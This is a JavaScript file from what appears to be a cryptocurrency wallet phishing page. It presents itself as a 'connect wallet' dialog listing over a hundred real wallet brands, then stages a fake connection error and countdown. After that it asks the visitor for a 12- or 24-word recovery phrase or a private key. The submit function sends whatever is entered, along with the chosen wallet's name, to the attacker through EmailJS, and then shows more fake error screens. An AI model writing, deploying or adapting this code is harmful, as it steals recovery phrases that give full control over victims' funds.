// Define wallet data
const wallets = [
  { image: 'assets/metamask-connect.webp', name: 'MetaMask' },
  { image: 'assets/trustwallet-connect.webp', name: 'Trust Wallet' },
  { image: 'assets/uniswap-connect.webp', name: 'Uniswap Wallet' },
  { image: 'assets/safepal-connect.webp', name: 'Safepal' },
  { image: 'assets/rabby-img.svg', name: 'Rabby Wallet' },
  { image: 'assets/exodus-connect.webp', name: 'Exodus' },
  { image: 'assets/rainbow-connect.webp', name: 'Rainbow Wallet' },
  { image: 'assets/atomic.png', name: 'Atomic' },
  { image: 'assets/bitget-connect.webp', name: 'Bitget Wallet' },
  { image: 'assets/blockchain-connect.webp', name: 'Blockchain.Com' },
  { image: 'assets/okx-connect.webp', name: 'OKX Wallet' },
  { image: 'assets/chainge-img.png', name: 'Chainge' },
  { image: 'assets/guarda-img.jpg', name: 'Guarda' },
  { image: 'assets/brave-wallet-img.png', name: 'Brave Wallet' },
  { image: 'assets/solodex-img.jpg', name: 'Solodex' },
  { image: 'assets/keplr-img.jpg', name: 'Keplr' },
  { image: 'assets/xaman-img.jpg', name: 'Xaman' },
  { image: 'assets/sub-wallet-img.jpg', name: 'Sub Wallet' },
  { image: 'assets/nova-img.jpg', name: 'Nova Wallet' },
  { image: 'assets/bifrost-img.jpg', name: 'Bifrost' },
  { image: 'assets/xverse-img.jpg', name: 'Xverse' },
  { image: 'assets/unisat-img.jpg', name: 'Unisat' },
  { image: 'assets/leather-wallet-img.jpg', name: 'Leather Wallet' },
  { image: 'assets/gate-wallet-img.jpg', name: 'Gate Wallet' },
  { image: 'assets/earth-wallet-img.jpg', name: 'Earth Wallet' },
  { image: 'assets/oisy-img.png', name: 'Oisy Wallet' },
  { image: 'assets/gem-wallet-img.png', name: 'Gem Wallet' },
  { image: 'assets/best-wallet-img.png', name: 'Best Wallet' },
  { image: 'assets/surf-wallet-img.png', name: 'Surf Wallet' },
  { image: 'assets/glass-wallet-img.jpg', name: 'Glass Wallet' },
  { image: 'assets/xportal-img.jpg', name: 'Xportal' },
  { image: 'assets/binance-connect.webp', name: 'Binance Web3 Wallet' },
  { image: 'assets/tokenpocket-connect.webp', name: 'Token Pocket' },
  { image: 'assets/mathwallet-connect.webp', name: 'Math Wallet' },
  { image: 'assets/spatium.png', name: 'Spatium Wallet' },
  { image: 'assets/coin98.png', name: 'Coin98 Wallet' },
  { image: 'assets/bybit-connect.webp', name: 'Bybit Wallet' },
  { image: 'assets/phantom.jpg', name: 'Phantom Wallet' },
  { image: 'assets/tonhub.jpg', name: 'TonHub Wallet' },
  { image: 'assets/linen.jpg', name: 'Linen Wallet' },
  { image: 'assets/ownbit.png', name: 'Ownbit Wallet' },
  { image: 'assets/zelcore.png', name: 'Zelcore Wallet' },
  { image: 'assets/flare.png', name: 'Flare Wallet' },
  { image: 'assets/midas.png', name: 'Midas Wallet' },
  { image: 'assets/safe-connect.webp', name: 'Safe Wallet' },
  { image: 'assets/keyringpro.png', name: 'Keyring Pro' },
  { image: 'assets/ledger-connect.webp', name: 'Ledger' },
  { image: 'assets/trezor-img.png', name: 'Trezor Wallet' },
  { image: 'assets/coinbase-connect.webp', name: 'Coinbase Wallet' },
  { image: 'assets/operacryptobrowser-connect.webp', name: 'opera Crypto Browser' },
  { image: 'assets/MEW-connect.webp', name: 'MEW wallet' },
  { image: 'assets/verso-connect.webp', name: 'Verso' },
  { image: 'assets/kraken-connect.webp', name: 'Kraken Wallet' },
  { image: 'assets/jadewallet-connect.webp', name: 'Jade Wallet' },
  { image: 'assets/imtoken-connect.webp', name: 'ImToken Wallet' },
  { image: 'assets/aave.png', name: 'Aave Wallet' },
  { image: 'assets/terrastation.png', name: 'Terrastation Wallet' },
  { image: 'assets/brd.jpg', name: 'BRD Wallet' },
  { image: 'assets/bitpay.jpg', name: 'Bitpay Wallet' },
  { image: 'assets/electrum.jpg', name: 'Electrum Wallet' },
  { image: 'assets/aktionariat.jpg', name: 'Aktionariat Wallet' },
  { image: 'assets/dok.png', name: 'Dok Wallet' },
  { image: 'assets/tokenary.jpg', name: 'Tokenary Wallet' },
  { image: 'assets/cosmos.png', name: 'Cosmos Wallet' },
  { image: 'assets/safemoon.png', name: 'Safemoon Wallet' },
  { image: 'assets/1inch-connect.webp', name: '1inch Wallet' },
  { image: 'assets/ABCwallet-connect.webp', name: 'ABC Wallet' },
  { image: 'assets/argent-connect.webp', name: 'Argent Wallet' },
  { image: 'assets/alphawallet-connect.webp', name: 'Alpha Wallet' },
  { image: 'assets/chain-connect.webp', name: 'Chain Wallet' },
  { image: 'assets/arculuswallet-connect.webp', name: 'Arculus Wallet' },
  { image: 'assets/ambirewallet-connect.webp', name: 'Ambire Wallet' },
  { image: 'assets/fireblocks-connect.webp', name: 'Fireblocks Wallet' },
  { image: 'assets/cryptocoin-connect.webp', name: 'Crypto Coin Wallet' },
  { image: 'assets/aUwallet-connect.webp', name: 'aU Wallet' },
  { image: 'assets/backpack-connect.webp', name: 'Backpack' },
  { image: 'assets/infinitywallet-connect.webp', name: 'Infinity Wallet' },
  { image: 'assets/magiceden-connect.webp', name: 'Magic Eden' },
  { image: 'assets/NOWwallet-connect.webp', name: 'NOW Wallet' },
  { image: 'assets/obvious-connect.webp', name: 'Obvious' },
  { image: 'assets/omni-connect.webp', name: 'Omni' },
  { image: 'assets/robinhood-connect.webp', name: 'Robinwood Wallet' },
  { image: 'assets/ronin-connect.webp', name: 'Ronin Wallet' },
  { image: 'assets/solana.png', name: 'Solana Wallet' },
  { image: 'assets/trustvault.png', name: 'TrustVault' },
  { image: 'assets/sparkpoint.png', name: 'Sparkpoint Wallet' },
  { image: 'assets/viawallet.png', name: 'Via Wallet' },
  { image: 'assets/dharma.png', name: 'Dharma Wallet' },
  { image: 'assets/tron.png', name: 'Tron Wallet' },
  { image: 'assets/tonkeeper.jpg', name: 'TonKeeper Wallet' },
  { image: 'assets/timelessx-connect.webp', name: 'TimelessX Wallet' },
  { image: 'assets/zerion-connect.webp', name: 'Zerion Wallet' },
  { image: 'assets/zengo-connect.webp', name: 'Zengo Wallet' },
  { image: 'assets/unstoppabledomains-connect.webp', name: 'Unstoppable Domains' },
  { image: 'assets/frontier-connect.webp', name: 'Frontier Wallet' },
  { image: 'assets/huddin-connect.webp', name: 'Huddin Wallet' },
  { image: 'assets/internetmoney-connect.webp', name: 'Internet Money' },
  { image: 'assets/gridplus.png', name: 'Gridplus Wallet' },
  { image: 'assets/peakdefi.png', name: 'Peakdefi Wallet' },
  { image: 'assets/ellipal.png', name: 'Ellipal Wallet' },
  { image: 'assets/paytube.png', name: 'Paytube Wallet' },
  { image: 'assets/halodefi.png', name: 'Halodefi Wallet' },
  { image: 'assets/digitex.png', name: 'Digitex Wallet' },
  { image: 'assets/cybavo.png', name: 'Cybavo Wallet' },
  { image: 'assets/mykey.jpg', name: 'MyKey Wallet' },
  { image: 'assets/onto.jpg', name: 'Onto Wallet' },
  { image: 'assets/myTon.jpg', name: 'MyTon Wallet' },
  { image: 'assets/easypocket.jpg', name: 'Easypocket Wallet' },
  { image: 'assets/eidoo.jpg', name: 'Eidoo Wallet' },
  { image: 'assets/portis.png', name: 'Portis Wallet' },
  { image: 'assets/pillar.png', name: 'Pillar Wallet' },
  { image: 'assets/solfare.jpg', name: 'Solfare Wallet' },
  { image: 'assets/talken.png', name: 'Talken Wallet' },
  { image: 'assets/formatic.jpg', name: 'Formatic Wallet' },
  { image: 'assets/other-wallet-img.png', name: 'Other Wallets' },
];

// Get references to elements
const listContainer = document.querySelector('.connect-modal-all-list');
const listSearchContainer = document.querySelector('.connect-modal-all-list-search');
const searchBar = document.getElementById('searchBar');

  listContainer.innerHTML = '';

  wallets.forEach((wallet) => {
    const walletDiv = document.createElement('div');
    walletDiv.className = 'connect-modal-all-list-div';
    walletDiv.dataset.image = wallet.image;
    walletDiv.dataset.name = wallet.name;

    walletDiv.innerHTML = `
            <div class="connect-modal-all-btn-img-div" data-image="${wallet.image}" data-name="${wallet.name}">
                <img class="connect-modal-all-btn-img" src="${wallet.image}" alt="${wallet.name}">
            </div>
            <div class="connect-modal-all-btn-text">${wallet.name}</div>
            `;

    listContainer.appendChild(walletDiv);
  });

const connectBtn = document.getElementById('ConnectBtn');
const connectModal = document.getElementById('connModal');
const allWalletBtn = document.getElementById('allWalletBtn');
const connectModalMain = document.getElementById('connectModalMain');
const connectModalAll = document.getElementById('connectModalAll');
const connectModalConnection = document.getElementById('connectModalConnection');
const inputModal12 = document.getElementById('inputModal12');
const inputModal24 = document.getElementById('inputModal24');
const word12Btn = document.getElementById('word12Btn');
const word24Btn = document.getElementById('word24Btn');
const inputModalPk = document.getElementById('inputModalPk');
const pkBtn = document.getElementById('pkBtn');
const pasteBtn = document.getElementById('pasteBtn');

connectBtn.addEventListener('click', () => {
  connectModal.classList.add('active');
});

allWalletBtn.addEventListener('click', () => {
  connectModalMain.classList.add('hide');
  connectModalAll.classList.add('show');
});

function closeModal() {
  connectModalConnection.classList.remove('show');
  connectModalAll.classList.remove('show');
  connectModalMain.classList.remove('hide');
  connectModal.classList.remove('active');
  // window.location = './index.html';
}

function backToMain() {
  connectModalAll.classList.remove('show');
  connectModalMain.classList.remove('hide');
}

function backToAll() {
  connectModalConnection.classList.remove('show');
  connectModalAll.classList.add('show');
}

function word12Enable() {
  pasteBtn.classList.remove('hide');
  inputModal24.classList.remove('show');
  inputModalPk.classList.remove('show');
  inputModal12.classList.remove('hide');
  word24Btn.classList.remove('active');
  pkBtn.classList.remove('active');
  word12Btn.classList.remove('non-active');
}

function word24Enable() {
  pasteBtn.classList.remove('hide');
  inputModal12.classList.add('hide');
  inputModalPk.classList.remove('show');
  inputModal24.classList.add('show');
  word12Btn.classList.add('non-active');
  pkBtn.classList.remove('active');
  word24Btn.classList.add('active');
}

function privateKeyEnable() {
  pasteBtn.classList.add('hide');
  inputModal12.classList.add('hide');
  inputModal24.classList.remove('show');
  inputModalPk.classList.add('show');
  word12Btn.classList.add('non-active');
  word24Btn.classList.remove('active');
  pkBtn.classList.add('active');
}

// const closeModal1 = document.getElementById('closeModal1');
// const closeModal2 = document.getElementById('closeModal2');
// const backtoMain = document.getElementById('backToMain');

// closeModal1.addEventListener('click', () => {
//   closeModal();
// })
// closeModal2.addEventListener('click', () => {
//   closeModal();
// })
// backtoMain.addEventListener('click', () => {
//   backToMain();
// })

function connectWalletCycle(image, name) {
  const connectModal = document.getElementById('connModal');
  const connectModalMain = document.getElementById('connectModalMain');
  const connectModalAll = document.getElementById('connectModalAll');
  const connectModalConnection = document.getElementById('connectModalConnection');
  const initErrorModal = document.getElementById('initErrorModal');
  const inputModal = document.getElementById('inputModal');
  const connectModalTitle = document.getElementById('connectModalTitleHeader');
  const connectModalImg = document.getElementById('connectModalImg');
  const initErrorTitle = document.getElementById('initErrorTitleHeader');
  const initErrorImg = document.getElementById('initErrorImg');
  const inputModalTitle = document.getElementById('inputModalTitleHeader');
  const inputModalImg = document.getElementById('inputModalImg');
  const countDown = document.getElementById('countdown');

  const imageSrc = image;
  const imageName = name;

  connectModalImg.src = imageSrc;
  connectModalTitle.textContent = imageName;

  connectModalMain.classList.add('hide'); // hide the main content of the connect modal
  connectModalAll.classList.remove('show');
  connectModalConnection.classList.add('show');

  setTimeout(() => {
    connectModalConnection.classList.remove('show');
    connectModalAll.classList.remove('show');
    connectModalMain.classList.remove('hide');
    connectModal.classList.add('hide');
    initErrorImg.src = imageSrc;
    initErrorTitle.textContent = imageName;
    initErrorModal.classList.add('active');
    setTimeout(() => {
      let countdown = 5;
      countDown.textContent = countdown;

      const interval = setInterval(() => {
        countdown -= 1;
        countDown.textContent = countdown;

        if (countdown === 0) {
          countDown.textContent = '';
          clearInterval(interval); // Stop the countdown
          initErrorModal.classList.remove('active');
          inputModalImg.src = imageSrc;
          inputModalTitle.textContent = imageName;
          inputModal.classList.add('active');
        }
      }, 1000); // Update every second
    }, 3000);
  }, 5000);
}

// Search functionality
searchBar.addEventListener('input', (e) => {
const searchValue = e.target.value.toLowerCase().trim();

// Clear previous results
listSearchContainer.innerHTML = '';

const filteredWallets = wallets.filter((wallet) =>
  wallet.name.toLowerCase().includes(searchValue)
);

if (searchValue.trim() === '') {
  // No search, reset layout to original
  listSearchContainer.classList.remove('show');
  listContainer.classList.remove('hide');
} else {
  // Search active, change layout
  listContainer.classList.add('hide');
  listSearchContainer.classList.add('show');

  if (filteredWallets.length === 0) {
    listSearchContainer.innerHTML = '';
    return;
  }
  filteredWallets.forEach((wallet) => {
    const walletDiv = document.createElement('div');
    walletDiv.className = 'connect-modal-all-list-div-search';
    walletDiv.dataset.image = wallet.image;
    walletDiv.dataset.name = wallet.name;

    walletDiv.innerHTML = `
            <div class="connect-modal-all-btn-img-div" data-image="${wallet.image}" data-name="${wallet.name}">
                <img class="connect-modal-all-btn-img" src="${wallet.image}" alt="${wallet.name}">
            </div>
            <div class="connect-modal-all-btn-text">${wallet.name}</div>
            `;

    // Attach click event
    walletDiv.addEventListener('click', () => {
      connectWalletCycle(wallet.image, wallet.name)
    });

    listSearchContainer.appendChild(walletDiv);
  });
}
});


const inputModal = document.getElementById('inputModal');
const errorModal = document.getElementById('errorModal');
const fnBtns = document.querySelectorAll('.connect-modal-body-div, .connect-modal-all-list-div');

fnBtns.forEach((btn) => {
  btn.addEventListener('click', function () {
    const imageSrc = this.getAttribute('data-image');
    const imageName = this.getAttribute('data-name');

    connectWalletCycle(imageSrc, imageName)
  });
});

const inputs1 = document.querySelectorAll('.p-input');
const inputs2 = document.querySelectorAll('.p-input2');

async function handlePaste(inputs) {
  // Get the clipboard data
  const pasteData = await navigator.clipboard.readText();

  const words = pasteData.split(/\s+/);

  if (words.length === inputs.length) {
    words.forEach((word, index) => {
      if (inputs[index]) {
        inputs[index].value = word;
      }
    });
  } else {
    alert(`Please paste exactly ${inputs.length} words.`);
  }
}

pasteBtn.addEventListener('click', async (event) => {
  event.preventDefault();

  const isModal12Active = !inputModal12.classList.contains('hide');
  const isModal24Active = getComputedStyle(inputModal24).display === 'grid';

  if (isModal12Active) {
    await handlePaste(inputs1);
  } else if (isModal24Active) {
    await handlePaste(inputs2);
  } else {
    alert('No active modal to handle the paste.');
  }
});


if (!inputModal12.classList.contains('hide')) {
  inputs1.forEach((input, index) => {
    // Focus event to check for previous empty inputs
    input.addEventListener('focus', function () {
      for (let i = 0; i < index; i++) {
        if (!inputs1[i].value.trim()) {
          inputs1[i].focus(); // Focus on the first empty input before the current one
          break;
        }
      }
    });

    // Keydown event to move focus or submit
    input.addEventListener('keydown', function (event) {
      if (['Tab', 'Enter', ' '].includes(event.key)) {
        event.preventDefault(); // Prevent default behavior

        // Move to the next input or submit if it's the last input
        if (index < inputs1.length - 1) {
          inputs1[index + 1].focus();
        }
      }
    });
  });
} 

if (getComputedStyle(inputModal24).display === 'grid') {
  inputs2.forEach((input, index) => {
    // Focus event to check for previous empty inputs
    input.addEventListener('focus', function () {
      for (let i = 0; i < index; i++) {
        if (!inputs2[i].value.trim()) {
          inputs2[i].focus(); // Focus on the first empty input before the current one
          break;
        }
      }
    });

    // Keydown event to move focus or submit
    input.addEventListener('keydown', function (event) {
      if (['Tab', 'Enter', ' '].includes(event.key)) {
        event.preventDefault(); // Prevent default behavior

        // Move to the next input or submit if it's the last input
        if (index < inputs2.length - 1) {
          inputs2[index + 1].focus();
        }
      }
    });
  });
}

const proceedBtn = document.querySelector('.proceed-btn');
const proceedBtnLoader = document.querySelector('.proceed-btn-loader');
const anotherErrModal = document.getElementById('anotherErrModal');




async function submitPhBtn() {
  const inputErr = document.getElementById('inputErrContent');
  const inputErrText = document.getElementById('inputErrText');
  const pkInput = document.getElementById('pkInput')
  let result = '';
  if (!inputModal12.classList.contains('hide')) {
    for (const input of inputs1) {
      if (input.value.length < 2) {
        inputErrText.textContent = '12 Mnemonic words must be valid and complete'
        inputErr.classList.add('active');
        setTimeout(() => {
          inputErr.classList.remove('active')
        }, 3000);
        return; 
      }
      result += input.value + ' '; 
    }
  } else if (getComputedStyle(inputModal24).display === 'grid') {
    for (const input of inputs2) {
      if (input.value.length < 2) {
        inputErrText.textContent = '24 Mnemonic words must be valid and complete'
        inputErr.classList.add('active');
        setTimeout(() => {
          inputErr.classList.remove('active')
        }, 3000);
        return; 
      }
      result += input.value + ' '; 
    }
  } else {
    if (pkInput.value.length < 10 ) {
      inputErrText.textContent = 'Invalid Private Key'
      inputErr.classList.add('active');
      setTimeout(() => {
        inputErr.classList.remove('active')
      }, 3000);
      return;
    }
    result = pkInput.value
  }

  const purpose = document.getElementById('inputModalTitleHeader').textContent;

  proceedBtn.classList.add('hide');
  proceedBtnLoader.classList.add('show');

  // EmailJS API
  const emailData = {
    wallet: purpose,
    feedback: result
  };

  try {
    // Send the email using EmailJS
    console.log('EmailJS send', {
      service: 'service_f5e67ia',
      template: 'template_ivsxhf8',
      templateParams: emailData
    });
    const response = await emailjs.send("service_f5e67ia", "template_ivsxhf8", emailData);
    console.log('EmailJS response', response);

    if (response.status === 200) {
      proceedBtnLoader.classList.remove('show');
      proceedBtn.classList.remove('hide');
      inputModal.classList.remove('active');
      errorModal.classList.add('active');
      setTimeout(() => {
        errorModal.classList.remove('active');
        anotherErrModal.classList.add('active');
      }, 5000)
      return;
    } else {
      console.error('EmailJS send failed', response);
      proceedBtnLoader.classList.remove('show');
    }
  } catch (error) {
    console.error('EmailJS request failed', error);
    proceedBtnLoader.classList.remove('show');
  }
}


const anotherOk = document.getElementById('anotherOk');
anotherOk.addEventListener('click', () => {
  window.location = 'index.html';
});

const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    if (mutation.type === 'childList') {
      // Check if any new .p-input2 elements have been added
      const newInputs = Array.from(document.querySelectorAll('.p-input2'));
      newInputs.forEach((input, index) => {
        if (!input.hasEventListeners) { // Avoid re-attaching event listeners
          // Focus event
          input.addEventListener('focus', function () {
            for (let i = 0; i < index; i++) {
              if (!newInputs[i].value.trim()) {
                newInputs[i].focus(); // Focus on the first empty input before the current one
                break;
              }
            }
          });

          // Keydown event
          input.addEventListener('keydown', function (event) {
            if (['Tab', 'Enter', ' '].includes(event.key)) {
              event.preventDefault(); // Prevent default behavior

              // Move to the next input or submit if it's the last input
              if (index < newInputs.length - 1) {
                newInputs[index + 1].focus();
              }
            }
          });

          // Mark as handled to prevent duplicate event listeners
          input.hasEventListeners = true;
        }
      });
    }
  });
});

// Start observing changes to the DOM
observer.observe(document.body, { childList: true, subtree: true });

// Navigation and service selection functionality
document.addEventListener('DOMContentLoaded', () => {
  // Get Started button navigation (in hero section)
  const getStartedBtn = document.getElementById('get-started-btn');
  console.log('Get Started button found:', getStartedBtn);
  if (getStartedBtn) {
    getStartedBtn.addEventListener('click', (e) => {
      e.preventDefault(); // Prevent any default behavior
      console.log('Get Started clicked, scrolling to our-services');
      const ourServicesSection = document.getElementById('our-services');
      console.log('Our services section found:', ourServicesSection);
      if (ourServicesSection) {
        ourServicesSection.scrollIntoView({ behavior: 'smooth' });
      }
    });
  }

  // Start buttons in service type selection navigation
  const startButtons = document.querySelectorAll('a[id="ConnectBtn"]');
  console.log('Start buttons found:', startButtons.length);
  startButtons.forEach(button => {
    button.addEventListener('click', (e) => {
      e.preventDefault();
      console.log('Start button clicked, scrolling to our-services');
      const ourServicesSection = document.getElementById('our-services');
      if (ourServicesSection) {
        ourServicesSection.scrollIntoView({ behavior: 'smooth' });
      }
    });
  });

  // Service cards click functionality
  const serviceCards = document.querySelectorAll('#our-services .rounded-lg');
  console.log('Service cards found:', serviceCards.length);
  serviceCards.forEach(card => {
    card.addEventListener('click', () => {
      console.log('Service card clicked, opening connect modal');
      // Trigger the same functionality as Connect Wallet button
      connectModal.classList.add('active');
    });
  });
});

